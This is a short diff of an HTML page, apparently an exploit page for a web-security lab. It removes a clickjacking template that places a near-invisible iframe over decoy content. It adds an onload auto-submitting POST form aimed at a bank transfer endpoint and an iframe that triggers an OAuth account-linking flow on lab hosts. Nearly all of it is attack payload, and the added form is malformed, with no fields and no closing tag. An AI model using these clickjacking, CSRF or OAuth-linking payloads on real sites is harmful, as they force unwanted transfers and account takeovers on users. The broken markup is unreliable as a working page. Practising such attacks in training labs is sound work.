@@ -1,25 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
-	<style>
-		#target_website {
-			position:relative;
-			width:128px;
-			height:128px;
-			opacity:0.00001;
-			z-index:2;
-			}
-		#decoy_website {
-			position:absolute;
-			width:300px;
-			height:400px;
-			z-index:1;
-			}
-	</style>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
 </head>
-...
-<body>
-	<div id="decoy_website">
-	...decoy web content here...
-	</div>
-	<iframe id="target_website" src="https://vulnerable-website.com">
-	</iframe>
+	<body onload="document.forms[0].submit()">
+		<form action="http://netbank.com/transfer.do" method="POST">
+
+	<iframe src="https://oauth-0a37005a04d8b690c0b0026202fe00da.oauth-server.net/auth?client_id=konk0ib692kpflhwmj75l&redirect_uri=https://0a8600ab04b0b64ac01804530025002b.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email"></iframe>
 </body>
+</html>
